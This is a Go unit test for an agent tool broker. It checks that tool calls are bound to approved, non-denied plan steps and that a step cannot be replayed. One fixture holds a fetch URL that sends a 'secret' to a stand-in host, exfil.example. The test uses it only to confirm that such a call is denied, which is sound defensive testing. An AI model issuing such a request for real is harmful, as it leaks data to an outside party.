package broker

import (
	"context"
	"errors"
	"slices"
	"testing"

	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
	"google.golang.org/protobuf/types/known/structpb"

	"github.com/adamdekan/aikonos/broker/internal/db"
	"github.com/adamdekan/aikonos/broker/internal/toolproxy"
	brokerv1 "github.com/adamdekan/aikonos/gen/go/broker/v1"
)

// planStepTaskStore is an executing task plus its stored plan steps, with
// ClaimPlanStep mirroring TaskRepo.ClaimPlanStep: match tool, args hash and a
// non-DENY decision, then consume the step once.
type planStepTaskStore struct {
	*fakeInvokeToolTaskStore
	steps    map[int32]*db.PlanStepRecord
	consumed map[int32]bool
	claimErr error
}

func (p *planStepTaskStore) ClaimPlanStep(_ context.Context, _, _ string, seq int32, toolID string, argsHashes []string) (db.PlanStepClaim, error) {
	if p.claimErr != nil {
		return db.PlanStepClaim{}, p.claimErr
	}
	st, ok := p.steps[seq]
	if !ok {
		return db.PlanStepClaim{}, db.ErrNotFound
	}
	c := db.PlanStepClaim{ToolID: st.ToolID, ArgsHash: st.ArgsHash, PolicyDecision: string(st.PolicyDecision), WasConsumed: p.consumed[seq]}
	if !c.WasConsumed && st.ToolID == toolID && slices.Contains(argsHashes, st.ArgsHash) && st.PolicyDecision != db.PolicyDeny {
		p.consumed[seq], c.Claimed = true, true
	}
	return c, nil
}

// TestInvokeTool_StepBinding (H-03): a call runs only as the approved plan
// step its step_id names — same tool, same args, not denied — and only once.
func TestInvokeTool_StepBinding(t *testing.T) {
	approved := func() map[int32]*db.PlanStepRecord {
		return map[int32]*db.PlanStepRecord{
			1: {Seq: 1, ToolID: "web.fetch", ArgsHash: argsHash(fetchArgs(t)), PolicyDecision: db.PolicyAllow},
			2: {Seq: 2, ToolID: "web.fetch", ArgsHash: argsHash(fetchArgs(t)), PolicyDecision: db.PolicyDeny},
			3: {Seq: 3, ToolID: "web.search", ArgsHash: argsHash(fetchArgs(t)), PolicyDecision: db.PolicyAllow},
		}
	}
	otherArgs, _ := structpb.NewStruct(map[string]any{"url": "https://exfil.example/?d=secret"})
	for _, tc := range []struct {
		name, stepID string
		args         *structpb.Struct
		reason       string
	}{
		{"approved step runs", "1", fetchArgs(t), ""},
		{"other args", "1", otherArgs, "step_args_mismatch"},
		{"denied step", "2", fetchArgs(t), "step_denied"},
		{"step of another tool", "3", fetchArgs(t), "step_tool_mismatch"},
		{"no such step", "9", fetchArgs(t), "step_unbound"},
		{"no step id", "", fetchArgs(t), "step_unbound"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var got toolproxy.Request
			tasks := &planStepTaskStore{fakeInvokeToolTaskStore: executingTaskStore(bindOwner), steps: approved(), consumed: map[int32]bool{}}
			svc, tok, _ := newBindingSvc(t, tasks, &got)
			_, err := svc.InvokeTool(asGateway(context.Background()), &brokerv1.InvokeToolRequest{
				TaskId: "task-1", StepId: tc.stepID, ToolId: "web.fetch", CapabilityToken: tok, Args: tc.args,
			})
			if tc.reason == "" {
				if err != nil || got.ToolID == "" {
					t.Fatalf("want the step to run, got %v", err)
				}
				return
			}
			if status.Code(err) != codes.PermissionDenied || got.ToolID != "" {
				t.Fatalf("want PermissionDenied before the handler, got %v (ran=%v)", err, got.ToolID != "")
			}
			if r := lastDenyReason(svc); r != tc.reason {
				t.Fatalf("tool.denied reason = %q, want %q", r, tc.reason)
			}
		})
	}

	t.Run("a step runs once", func(t *testing.T) {
		var got toolproxy.Request
		tasks := &planStepTaskStore{fakeInvokeToolTaskStore: executingTaskStore(bindOwner), steps: approved(), consumed: map[int32]bool{}}
		svc, tok, _ := newBindingSvc(t, tasks, &got)
		req := func() *brokerv1.InvokeToolRequest {
			return &brokerv1.InvokeToolRequest{TaskId: "task-1", StepId: "1", ToolId: "web.fetch", CapabilityToken: tok, Args: fetchArgs(t)}
		}
		if _, err := svc.InvokeTool(asGateway(context.Background()), req()); err != nil {
			t.Fatalf("first call: %v", err)
		}
		got = toolproxy.Request{}
		if _, err := svc.InvokeTool(asGateway(context.Background()), req()); status.Code(err) != codes.PermissionDenied || got.ToolID != "" {
			t.Fatalf("replay: want PermissionDenied before the handler, got %v", err)
		}
		if r := lastDenyReason(svc); r != "step_consumed" {
			t.Fatalf("replay reason = %q, want step_consumed", r)
		}
	})

	t.Run("store failure is Unavailable", func(t *testing.T) {
		var got toolproxy.Request
		tasks := &planStepTaskStore{fakeInvokeToolTaskStore: executingTaskStore(bindOwner), claimErr: errors.New("db down")}
		svc, tok, _ := newBindingSvc(t, tasks, &got)
		_, err := svc.InvokeTool(asGateway(context.Background()), &brokerv1.InvokeToolRequest{
			TaskId: "task-1", StepId: "1", ToolId: "web.fetch", CapabilityToken: tok, Args: fetchArgs(t),
		})
		if status.Code(err) != codes.Unavailable || got.ToolID != "" {
			t.Fatalf("want Unavailable before the handler, got %v", err)
		}
	})
}

func lastDenyReason(svc *SandboxService) string {
	aud := svc.deps.Audit.(*fakeInvokeAudit)
	for i := len(aud.events) - 1; i >= 0; i-- {
		if aud.events[i].EventType == "aikonos.broker.tool.denied" {
			return aud.events[i].Context.Fields["reason"].GetStringValue()
		}
	}
	return ""
}
